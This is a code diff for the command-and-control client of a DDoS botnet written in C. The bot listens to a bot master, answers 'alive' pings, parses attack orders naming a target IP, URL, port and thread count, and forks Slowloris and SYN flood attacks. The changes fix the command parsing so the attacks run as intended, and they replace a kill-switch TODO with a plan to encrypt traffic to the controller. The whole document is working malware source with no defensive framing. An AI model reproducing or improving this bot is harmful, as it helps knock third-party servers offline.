@@ -10,8 +10,8 @@
 
 #define BOT_MASTER "127.0.0.1"
 
-// *****SERIOUS******
-// needs to add a kill switch
+// ******************** TO DO *****************
+// -> Add SSL encryption when communicating with the server
 
 int main_sock;
 struct sockaddr_in server;
@@ -29,7 +29,7 @@ void wait_and_close(int f_write)
 			// Run the code to tell that we are alive.
 			sendto(main_sock, "?YES!", 5, 0, (struct sockaddr*)&server, sizeof(struct sockaddr_in));
 		}else if(strstr(data, "[!DDOS!]") != NULL){
-			// Run the exit stuff here
+			//printf("[!DDOS!] Recieved\n");
 			write(f_write, "EXIT", 4);
 			close(f_write);
 			return;
@@ -53,7 +53,6 @@ void DDOS(int type, char *target_ip, short port, int n_thrds, char *target_url)
 			close(msg_pipe[1]);
 			// Here goes the flood_slow_loris.
 			flood_slow_loris(target_ip, n_thrds, NULL, msg_pipe[0]);
-			exit(0);
 		}else{
 			close(msg_pipe[0]);
 			wait_and_close(msg_pipe[1]);
@@ -81,18 +80,16 @@ void DDOS(int type, char *target_ip, short port, int n_thrds, char *target_url)
 		if(pid1 == 0){
 			close(msg_pipe[1]);
 			flood_slow_loris(target_url, n_thrds, NULL, msg_pipe[0]);
-			exit(0);
 		}
 		pid_t pid2 = fork();
 
 		if(pid2 == 0){
 			close(msg_pipe[1]);
 			flood_with_syn(target_ip, port, n_thrds, msg_pipe[0]);
-			exit(0);
 		}
 		wait_and_close(msg_pipe[1]);
 	}
-
+	return;
 }
 
 void init(char *to_con, int port)
@@ -112,6 +109,7 @@ void connect_to_master()
 	char s_port[6];
 	server_size = sizeof(struct sockaddr);
 	while(1){
+		memset(data_recved, 0, 80);
 		bytes = recvfrom(main_sock, data_recved, 80, 0, (struct sockaddr *)&server, &server_size);		
 
 		if (bytes== ERROR){
@@ -136,14 +134,14 @@ void connect_to_master()
 			char *i_of_ip = index(data_recved, (int ) ' ')+1;
 			int len_ip =  (index(i_of_ip+1, (int ) ' ')) - i_of_ip;
 			strncpy(target_ip, i_of_ip, len_ip);
+			target_ip[len_ip] = 0;
 			// DEBUG
-			printf("IP: %s|\n", target_ip);
+			printf("\033[0;35mIP: %s\n", target_ip);
 
-			char *i_of_thrds = index(i_of_ip+len_ip, (int ) ' ')+1;
-			int len_thrds = (index(i_of_thrds+1, (int) ' ')) - i_of_thrds;
-			strncpy(thrds, i_of_thrds, len_thrds);
+			char *i_of_thrds = i_of_ip+len_ip+1;
+			strncpy(thrds, i_of_thrds, 4);
 			// DEBUG
-			printf("Threads: %s|\n", thrds);
+			printf("Threads: %s\033[0m\n", thrds);
 
 			DDOS(type, target_ip, NULL, atoi(thrds), NULL);
 
@@ -153,25 +151,26 @@ void connect_to_master()
 			char *i_of_ip = index(data_recved, (int ) ' ')+1;
 			int len_ip =  (index(i_of_ip+1, (int ) ' ')) - i_of_ip;
 			strncpy(target_ip, i_of_ip, len_ip);
+			target_ip[len_ip] = 0;
 			// DEBUG
-			printf("IP: %s|\n", target_ip);
+			printf("\033[0;32mIP: %s\n", target_ip);
 
 			char *i_of_thrds = i_of_ip+len_ip+1;
 			unsigned char len_thrds = (index(i_of_thrds, (int) ' ')) - i_of_thrds;
 			strncpy(thrds, i_of_thrds, len_thrds);
 			thrds[len_thrds] = 0;
 			// DEBUG
-			printf("Threads: %s| len= %d\n", thrds, len_thrds);
+			printf("Threads: %s\n", thrds, len_thrds);
 
-			char *i_of_port = index(i_of_thrds+len_thrds, (int ) ' ')+1;
+			char *i_of_port = i_of_thrds+len_thrds+1;
 			//int len_port = (index(i_of_thrds+1, (int ) ' ')) - i_of_port;
 			strncpy(s_port, i_of_port, 6);
 			// DEBUG
-			printf("port: %s|\n", s_port);
+			printf("port: %s\033[0m\n", s_port);
 
 			DDOS(type, target_ip, atoi(s_port), atoi(thrds), NULL);
 
-		}else if(strncmp(data_recved, "*", 1)){
+		}else if(strncmp(data_recved, "*", 1) == 0){
 			type = ALL;
 
 			char target_url[30];
@@ -179,25 +178,28 @@ void connect_to_master()
 			char *i_of_ip = index(data_recved, (int ) ' ')+1;
 			int len_ip =  (index(i_of_ip+1, (int ) ' ') - i_of_ip);
 			strncpy(target_ip, i_of_ip, len_ip);
+			target_ip[len_ip] = 0;
 			// DEBUG
-			printf("IP: %s|\n", target_ip);
+			printf("\033[0;36mIP: %s|\n", target_ip);
 
-			char *i_of_url = index(i_of_ip+len_ip, (int ) ' ')+1;
+			char *i_of_url = i_of_ip+len_ip+1;
 			int len_url = (index(i_of_url+1, (int ) ' ') - i_of_url);
 			strncpy(target_url, i_of_url, len_url);
+			target_url[len_url] = 0;
 			// DEBUG
 			printf("URL: %s\n", target_url);
 
-			char *i_of_port = index(i_of_url+len_url, (int )' ')+1;
+			char *i_of_port = i_of_url+len_url+1;
 			int len_port = (index(i_of_port+1, (int) ' ') - i_of_port);
 			strncpy(s_port, i_of_port, len_port);
+			s_port[len_port] = 0;
 			// DEBUG
 			printf("Port for SYN_FLOOD: %s\n", s_port);
 
 			char *i_of_thrds = rindex(data_recved, (int) ' ')+1;
 			strncpy(thrds, i_of_thrds, 4);
 			// DEBUG
-			printf("Threads: %s\n", thrds);
+			printf("Threads: %s\033[0m\n", thrds);
 
 			DDOS(type, target_ip, atoi(s_port), atoi(thrds), target_url);
 
